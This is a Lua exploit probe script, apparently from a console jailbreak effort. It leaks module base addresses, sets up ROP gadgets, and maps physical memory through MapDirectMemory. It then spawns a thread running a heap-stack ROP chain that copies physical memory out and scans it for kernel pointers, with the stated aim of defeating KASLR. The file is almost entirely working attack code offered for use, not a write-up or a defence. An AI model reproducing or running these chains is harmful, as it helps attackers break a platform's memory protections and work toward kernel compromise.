-- CRASH_CLASS: MODERATE
-- PROBE 562v: Heap-stack child reads from MapDirectMemory
--
-- 562u PROVED: heap stack avoids trace blocks entirely.
-- Child executes, main thread polls sentinel, process lives.
--
-- NOW: Can the child READ from a MapDM'd page?
-- MapDM maps physical memory to a VA. Previous probes showed
-- children CAN read from MapDM (DEADFACE sentinel), but the
-- trace killed the process before results could be extracted.
-- With heap stack, if no trace → results survive → KASLR defeat.
--
-- PLAN:
-- 1. MapDM phys 0x100000000 → VA (via fcall, no mmap writes)
-- 2. Build child chain on HEAP: read 4 qwords from MapDM VA → shared
-- 3. Spawn child, poll sentinel, print results

print("=== PROBE 562v: HEAP STACK + MAPDM READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Module bases
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4
io.flush()

-- ============================================================
-- [A] MapDM: phys 0x100000000 → VA 0x880000000
-- ============================================================
print("[A] MapDM phys 0x100000000")
local mapped_va = uint64("0x880000000")
-- VA reservation via mmap — but we do it via fcall, no Lua wq to it
pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print("MapDM rv=" .. md_rv)
if md_rv ~= 0 then
    print("MAPDM_FAILED — aborting")
    print("=== 562v DONE ===")
    return
end
io.flush()

-- ============================================================
-- [B] Shared buffer + HEAP stack + chain
-- ============================================================
local shared = memory.alloc(0x80)
local sh = N(shared)
for i = 0, 0x7C, 4 do wd(sh + i, 0) end

local ss = 0x4000
local stack_buf = memory.alloc(ss)
local sb = N(stack_buf)
local rsp = sb + ss - ((sb + ss) % 16) - 8

print(string.format("[B] HEAP stack 0x%X rsp=0x%X", sb, rsp))
io.flush()

-- Fake TCB
local tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb) + i, 0) end
wq(N(tcb), uint64(N(tcb)))
local fsb = memory.alloc(8)
wq(N(fsb), uint64(N(tcb)))

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- sysarch(SET_FSBASE=129)
emit(g_pop_rdi); emit(uint64(129))
emit(g_pop_rsi); emit(uint64(N(fsb)))
emit(g_pop_rax); emit(uint64(165))
emit(stub)

-- Read 4 qwords from mapped_va → shared+0x10..0x28
for qi = 0, 3 do
    emit(g_pop_rsi); emit(mapped_va + uint64(qi * 8))
    emit(g_mov_rax_m)     -- rax = [rsi]
    emit(g_pop_rdi); emit(uint64(sh + 0x10 + qi * 8))
    emit(g_mov_m_rax)     -- [rdi] = rax
end

-- Sentinel: 0xDEADFACECAFEBABE → shared+0x00
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("  chain: %d entries", off/8))
io.flush()

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

-- ============================================================
-- [C] Spawn + poll + output
-- ============================================================
print("[C] spawn + poll")
io.flush()
local ok_s, rv_s = pcall(function() return mk(455)(pa, uint64(0x38)) end)
print("spawn=" .. (ok_s and N(rv_s) or -999))
io.flush()

-- Poll sentinel
local found = false
local found_iter = 0
for i = 1, 2000000 do
    local sv = rb(sh)
    if sv and sv == 0xDEADFACE then
        found = true
        found_iter = i
        break
    end
end

print("")
if found then
    print("SENTINEL_FOUND iter=" .. found_iter)
    for qi = 0, 3 do
        local lo = rb(sh + 0x10 + qi * 8) or 0
        local hi = rb(sh + 0x14 + qi * 8) or 0
        local tag = ""
        if lo == 0x464C457F then tag = " *** ELF MAGIC ***" end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("phys+0x%02X = 0x%08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    print("SENTINEL_NOT_FOUND")
    local sv = rb(sh) or 0
    print(string.format("sentinel_raw=0x%08X", sv))
    for qi = 0, 3 do
        local lo = rb(sh + 0x10 + qi * 8) or 0
        local hi = rb(sh + 0x14 + qi * 8) or 0
        print(string.format("phys+0x%02X = 0x%08X_%08X (unconfirmed)", qi*8, hi, lo))
    end
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562v DONE ===")
